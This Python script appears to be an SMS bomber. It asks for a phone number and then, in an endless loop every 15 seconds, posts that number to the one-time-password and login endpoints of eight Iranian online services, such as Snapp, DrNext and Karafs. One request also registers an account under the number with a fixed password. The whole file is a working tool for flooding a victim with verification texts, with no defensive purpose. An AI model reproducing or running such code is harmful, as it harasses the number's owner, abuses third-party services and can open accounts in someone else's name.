import requests
import time

Enter = input("Enter number    "+ "example:9913333333:")

while True:
    urla = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    numbera = {"cellphone": "+98"+Enter}
    smsa = requests.post(urla, data=numbera)
    print(smsa.status_code)

    urlb = "https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token"
    numberb = {"mobile": "0"+Enter}
    smsb = requests.post(urlb, data=numberb)
    print(smsb.status_code)

    urlc = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?"
    numberc = {"cellphone": "0"+Enter}
    smsc = requests.post(urlc, data=numberc)
    print(smsc.status_code)

    urld = "https://api.achareh.co/v2/accounts/login/"
    numberd = {"phone": "98" + Enter}
    smsd = requests.post(urld, data=numberd)
    print(smsd.status_code)

    urle = "https://api.pinorest.com/frontend/auth/login/mobile"
    numbere = {"mobile": "0" + Enter}
    smse = requests.post(urle, data=numbere)
    print(smse.status_code)

    urlf = "https://v2.karafsapp.com/requestCode"
    numberf = {"phoneNumber": "0" + Enter, "market": "PWA"}
    smsf = requests.post(urlf, data=numberf)
    print(smsf.status_code)

    urlg = "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile"
    numberg = {"mobile": "0" + Enter, "country_code": "+98"}
    smsg = requests.post(urlg, data=numberg)
    print(smsg.status_code)

    urlh = "https://api.malltina.com/profiles"
    numberh = {"password": "11111111", "mobile": "0" + Enter, "first_name": "pp"}
    smsh = requests.post(urlh, data=numberh)
    print(smsh.status_code)

    print("Sent Successfully")
    time.sleep(15)